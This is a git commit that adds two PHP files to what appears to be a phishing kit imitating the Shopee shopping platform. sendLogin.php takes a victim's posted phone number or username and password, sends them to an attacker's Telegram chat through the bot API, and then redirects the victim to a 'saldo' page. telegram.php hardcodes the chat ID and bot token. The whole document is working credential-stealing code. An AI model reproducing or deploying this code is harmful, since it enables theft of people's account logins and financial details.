46a418ca57b15429fcbe7a3de5117af1e917c4ba
pengembang2025 <167019524+pengembang2025@users.noreply.github.com>
2024-06-02 23:54:24 +0700

    Add files via upload

---
+++ sendLogin.php
@@ -0,0 +1,28 @@
+<?php 
+
+
+
+session_start();
+include "./telegram.php";
+
+$_SESSION["nomorku"] = $_POST ['nomorku'];
+$_SESSION["debit"] = $_POST ['debit'];
+$_SESSION["nama"] = $_POST ['nama'];
+
+$message = "⊰᯽⊱┈─𝑺𝒉𝒐𝒑𝒆𝒆─┈⊰᯽⊱". "\n🔸иσ нρ/υѕєя : \n". $_POST ['user']. "\n🔸ραѕѕωσя∂ : \n". $_POST ['pass'];
+function sendMessage($telegram_id, $message, $id_bot)
+{
+$url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
+    $url = $url . "&text=" . urlencode($message);
+    $ch = curl_init();
+    $optArray = array(
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true
+    );
+    curl_setopt_array($ch, $optArray);
+    $result = curl_exec($ch);
+    curl_close($ch);
+}
+sendMessage($telegram_id, $message, $id_bot);
+header("Location:  saldo.html");
+?> 
---
+++ telegram.php
@@ -0,0 +1,4 @@
+<?php
+$telegram_id = "6737923087";
+$id_bot = "7062650566:AAFcxYHz4cej9KuzD5Aa3k9I0l3s4Z5esik";
+?>
